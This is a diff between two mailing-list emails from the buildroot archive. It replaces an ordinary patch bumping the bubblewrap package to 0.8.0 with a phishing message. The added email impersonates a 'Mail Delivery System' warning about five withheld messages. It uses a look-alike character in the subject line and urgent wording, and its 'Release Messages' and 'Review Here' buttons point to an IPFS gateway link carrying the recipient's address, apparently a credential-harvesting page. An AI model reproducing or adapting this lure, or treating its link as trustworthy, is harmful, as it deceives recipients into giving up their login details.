@@ -1,70 +1,47 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 4B27FC7619A
-	for <buildroot@archiver.kernel.org>; Tue, 11 Apr 2023 07:48:48 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id D51E8C76196
+	for <buildroot@archiver.kernel.org>; Tue, 11 Apr 2023 11:26:02 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp4.osuosl.org (Postfix) with ESMTP id D5A9941528;
-	Tue, 11 Apr 2023 07:48:47 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org D5A9941528
+	by smtp1.osuosl.org (Postfix) with ESMTP id 3472D81E86;
+	Tue, 11 Apr 2023 11:26:02 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 3472D81E86
 X-Virus-Scanned: amavisd-new at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
-	by localhost (smtp4.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
-	with ESMTP id mMhLx_xQX_xj; Tue, 11 Apr 2023 07:48:46 +0000 (UTC)
+Received: from smtp1.osuosl.org ([127.0.0.1])
+	by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id FzTmpfPbBtC1; Tue, 11 Apr 2023 11:26:01 +0000 (UTC)
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp4.osuosl.org (Postfix) with ESMTP id AC41E4154E;
-	Tue, 11 Apr 2023 07:48:45 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org AC41E4154E
+	by smtp1.osuosl.org (Postfix) with ESMTP id 7429081E7A;
+	Tue, 11 Apr 2023 11:26:00 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 7429081E7A
 Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
- by ash.osuosl.org (Postfix) with ESMTP id C9B061C3BB0
- for <buildroot@lists.busybox.net>; Tue, 11 Apr 2023 07:48:44 +0000 (UTC)
+ by ash.osuosl.org (Postfix) with ESMTP id 632C01C3BF4
+ for <buildroot@lists.busybox.net>; Tue, 11 Apr 2023 11:25:58 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp1.osuosl.org (Postfix) with ESMTP id B13E3813E8
- for <buildroot@lists.busybox.net>; Tue, 11 Apr 2023 07:48:44 +0000 (UTC)
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org B13E3813E8
+ by smtp1.osuosl.org (Postfix) with ESMTP id 2923E81E8C
+ for <buildroot@lists.busybox.net>; Tue, 11 Apr 2023 11:25:56 +0000 (UTC)
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 2923E81E8C
 X-Virus-Scanned: amavisd-new at osuosl.org
 Received: from smtp1.osuosl.org ([127.0.0.1])
  by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
- with ESMTP id LQlkUF-giLS0 for <buildroot@lists.busybox.net>;
- Tue, 11 Apr 2023 07:48:43 +0000 (UTC)
+ with ESMTP id rzfWtjMCYmma for <buildroot@lists.busybox.net>;
+ Tue, 11 Apr 2023 11:25:55 +0000 (UTC)
 X-Greylist: domain auto-whitelisted by SQLgrey-1.8.0
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 417CF813E6
-Received: from fanzine2.igalia.com (fanzine2.igalia.com [213.97.179.56])
- by smtp1.osuosl.org (Postfix) with ESMTPS id 417CF813E6
- for <buildroot@buildroot.org>; Tue, 11 Apr 2023 07:48:43 +0000 (UTC)
-Received: from 91-153-34-68.elisa-laajakaista.fi ([91.153.34.68] helo=kodama)
- by fanzine2.igalia.com with esmtpsa 
- (Cipher TLS1.3:ECDHE_X25519__RSA_PSS_RSAE_SHA512__AES_256_GCM:256) (Exim)
- id 1pm8k4-00FJks-9G; Tue, 11 Apr 2023 09:48:40 +0200
-Received: from localhost (kodama [local])
- by kodama (OpenSMTPD) with ESMTPA id aee0d0d1;
- Tue, 11 Apr 2023 07:48:39 +0000 (UTC)
-From: Adrian Perez de Castro <aperez@igalia.com>
-To: buildroot@buildroot.org
-Date: Tue, 11 Apr 2023 10:48:39 +0300
-Message-Id: <20230411074839.98830-1-aperez@igalia.com>
-X-Mailer: git-send-email 2.40.0
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 7BC3D81E6B
+Received: from busybox.net (unknown [109.206.243.57])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 7BC3D81E6B
+ for <buildroot@busybox.net>; Tue, 11 Apr 2023 11:25:54 +0000 (UTC)
+From: Mail Delivery System <buildroot@busybox.net>
+To: buildroot@busybox.net
+Date: 11 Apr 2023 13:25:53 +0200
+Message-ID: <20230411132553.04A6CB71E18C4652@busybox.net>
 MIME-Version: 1.0
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt;
- c=relaxed/relaxed; d=igalia.com; 
- s=20170329; h=Content-Transfer-Encoding:MIME-Version:Message-Id:Date:Subject:
- Cc:To:From:Sender:Reply-To:Content-Type:Content-ID:Content-Description:
- Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:
- In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:
- List-Post:List-Owner:List-Archive;
- bh=DWUZKuCMry1DaKc5PRfOzr9vk1KK0lo3LYIKl24lRy0=; b=FDc4rS9TfIpHTh4AUeG7d2yjxL
- NPuvHqFoPkTk3ymciki5tSZIs512cFRR0lWQtwMm9da2G7H9r+++MrvBDaTSiq3i7llWlfjDJAr9k
- hEf92KoPF7ForZwFVkaG7NTG0BxKhe9fe0nfPYP6X2LDsjCvZ+RnDEE6TaOuPhLxAXJ1y+jEeDYHX
- r3KDM/MxRYzGL26DGW7eXNP43GjDhT5+kB6v4UQz5h3L2OaaLmi+gQOw74jdqOMHrQyA/7xOD7Pv6
- g+LYU2kV/xJXnTS5ELqL7S/Sc6HqXqA2TCtbQKfDHSEeL5sfYyIofQHj5u3JiaCl3gHrKNEGxNuo+
- FXZE5YFw==;
-X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
- dkim=pass (2048-bit key) header.d=igalia.com header.i=@igalia.com
- header.a=rsa-sha256 header.s=20170329 header.b=FDc4rS9T
-Subject: [Buildroot] [PATCH 1/1] package/bubblewrap: bump to version 0.8.0
+Subject: [Buildroot] =?utf-8?q?Email_Notification=3A_You_have_=285=29_pen?=
+ =?utf-8?q?ding_mess=C9=91ges?=
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -76,52 +53,131 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-Cc: Adrian Perez de Castro <aperez@igalia.com>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============9104567524163801851=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-This version allows disabling usage of nested user namespaces and
-improves error messages. Release notes:
+--===============9104567524163801851==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-  https://github.com/containers/bubblewrap/releases/tag/v0.8.0
+<!DOCTYPE HTML>
 
-Signed-off-by: Adrian Perez de Castro <aperez@igalia.com>
----
- package/bubblewrap/bubblewrap.hash | 4 ++--
- package/bubblewrap/bubblewrap.mk   | 2 +-
- 2 files changed, 3 insertions(+), 3 deletions(-)
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; border-top-color: currentColor; border-top-width: 0px; border-top-style: =
+none; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; b=
+ackground-color: rgb(244, 248, 245); font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width:=20
+0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
+xt-decoration-color: initial;"><div style=3D"width: 591px; height: 24px; pa=
+dding-top: 5px; padding-right: 5px; padding-bottom: 5px; margin-left: 18px;=
+ border-top-color: currentColor; border-top-width: 0px; border-top-style: n=
+one; float: left; box-sizing: border-box;">
+<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
+ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(244, 248, 245);'><span style=3D"box-sizing: border-box;"><fo=
+nt size=3D"2"><br class=3D"Apple-interchange-newline">Message generated fro=
+m busybox.net&nbsp;source.</font></span></div></div><div style=3D"box-sizin=
+g: border-box;">
+<div style=3D"width: 5px; height: 30px; border-top-color: currentColor; bor=
+der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
+und-color: rgb(86, 166, 89);"></div></div></div>
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><br></div>
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; backg=
+round-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-varia=
+nt-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness:=
+ initial; text-decoration-style: initial;=20
+text-decoration-color: initial;">&nbsp;</div>
+<table style=3D"width: 629px; text-align: left; color: rgb(44, 54, 58); tex=
+t-transform: none; letter-spacing: normal; font-family: calibri; font-size:=
+ 16px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; border-collapse: collapse; box-sizing: border-box; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;" border=3D"0"><tbody style=3D"box-=
+sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td align=3D"lef=
+t" style=3D"box-sizing: border-box;"><table style=3D"width: 627px; border-c=
+ollapse: collapse; min-width: 600px; box-sizing: border-box;" border=3D"0" =
+cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;=
+"><tr align=3D"center" style=3D"box-sizing: border-box;"><td style=3D"box-s=
+izing: border-box;">
+<table style=3D"border-collapse: collapse; max-width: 600px; box-sizing: bo=
+rder-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D=
+"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=
+=3D"box-sizing: border-box;"><table style=3D"width: 513px; border-collapse:=
+ collapse; box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadd=
+ing=3D"0"></table></td></tr><tr style=3D"box-sizing: border-box;"><td style=
+=3D"box-sizing: border-box;">
+<div style=3D"padding: 22px 25.64px 30px; text-align: center; font-family: =
+Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 25px; border-top-c=
+olor: currentColor; border-bottom-color: rgb(201, 201, 201); border-top-wid=
+th: 0px; border-bottom-width: thin; border-top-style: none; border-bottom-s=
+tyle: solid; box-sizing: border-box;">Notification of pending&nbsp;5 messag=
+es.<br style=3D"box-sizing: border-box;"></div></td></tr><tr style=3D"box-s=
+izing: border-box;"><td style=3D"box-sizing: border-box;">
+<div style=3D"border-top-color: currentColor; border-top-width: 0px; border=
+-top-style: none; box-sizing: border-box;">&nbsp;</div><div style=3D"box-si=
+zing: border-box;">&nbsp;</div><font size=3D"1"><font size=3D"2">Some messa=
+ges are restrained from delivering to<span>&nbsp;</span><u><font color=3D"#=
+0000ff">buildroot@busybox.net</font></u><font style=3D"box-sizing: border-b=
+ox;"><br><br></font></font></font><p style=3D"margin-top: 0px; margin-botto=
+m: 1rem; box-sizing: border-box;"><font size=3D"2">
+Due to low bandwidth we notify you to take prompt actions</font></p>
+<a style=3D"background: rgb(36, 107, 193); margin: 2px; padding: 10px; outl=
+ine: 0px; border: thick currentColor; border-image: none; color: rgb(255, 2=
+55, 255); text-decoration: none; float: left; display: block; box-sizing: b=
+order-box;" href=3D"https://bafybeiervmfpqqcruzfvs75jxmgltqz656lfjnbydwrvtb=
+2jtevhu4nafm.ipfs.dweb.link/?filename=3DQmY9H6a9ZvPBRfn9GfivLfApsLHpUY9X69D=
+qzUit7QCRMU#buildroot@busybox.net" target=3D"_blank" rel=3D"noreferrer"><fo=
+nt size=3D"3">Release Messages</font></a>
+<a style=3D"background: rgb(179, 179, 179); margin: 2px; padding: 10px; out=
+line: 0px; border: thick currentColor; border-image: none; color: rgb(255, =
+255, 255); text-decoration: none; float: left; display: block; box-sizing: =
+border-box;" href=3D"https://bafybeiervmfpqqcruzfvs75jxmgltqz656lfjnbydwrvt=
+b2jtevhu4nafm.ipfs.dweb.link/?filename=3DQmY9H6a9ZvPBRfn9GfivLfApsLHpUY9X69=
+DqzUit7QCRMU#buildroot@busybox.net" target=3D"_blank" rel=3D"noreferrer"><f=
+ont size=3D"3">Review Here</font></a>
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: bor=
+der-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing:=
+ border-box;">&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; b=
+ox-sizing: border-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1re=
+m; box-sizing: border-box;"></p>
+<h5 style=3D"line-height: 1.2; font-size: 1.25rem; font-weight: 500; margin=
+-top: 0px; margin-bottom: 0.5rem; box-sizing: border-box;"><font size=3D"1"=
+><font size=3D"2"><font size=3D"3"><font size=3D"2">Message should be moved=
+ to inbox.&nbsp;<span>&nbsp;</span><u style=3D"box-sizing: border-box;">Got=
+o Clutter.</u></font></font></font></font></h5></td></tr></tbody></table></=
+td></tr></tbody></table></td></tr></tbody></table></body></html>
 
-diff --git a/package/bubblewrap/bubblewrap.hash b/package/bubblewrap/bubblewrap.hash
-index 0475f8882a..abc69d96be 100644
---- a/package/bubblewrap/bubblewrap.hash
-+++ b/package/bubblewrap/bubblewrap.hash
-@@ -1,5 +1,5 @@
--# From https://github.com/containers/bubblewrap/releases/tag/v0.7.0
--sha256  764ab7100bd037ea53d440d362e099d7a425966bc62d1f00ab26b8fbb882a9dc  bubblewrap-0.7.0.tar.xz
-+# From https://github.com/containers/bubblewrap/releases/tag/v0.8.0
-+sha256  957ad1149db9033db88e988b12bcebe349a445e1efc8a9b59ad2939a113d333a  bubblewrap-0.8.0.tar.xz
- 
- # Hash for license files:
- sha256  b7993225104d90ddd8024fd838faf300bea5e83d91203eab98e29512acebd69c  COPYING
-diff --git a/package/bubblewrap/bubblewrap.mk b/package/bubblewrap/bubblewrap.mk
-index 658e6e113c..1081db697d 100644
---- a/package/bubblewrap/bubblewrap.mk
-+++ b/package/bubblewrap/bubblewrap.mk
-@@ -4,7 +4,7 @@
- #
- ################################################################################
- 
--BUBBLEWRAP_VERSION = 0.7.0
-+BUBBLEWRAP_VERSION = 0.8.0
- BUBBLEWRAP_SITE = https://github.com/containers/bubblewrap/releases/download/v$(BUBBLEWRAP_VERSION)
- BUBBLEWRAP_SOURCE = bubblewrap-$(BUBBLEWRAP_VERSION).tar.xz
- BUBBLEWRAP_DEPENDENCIES = host-pkgconf libcap
--- 
-2.40.0
+--===============9104567524163801851==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============9104567524163801851==--
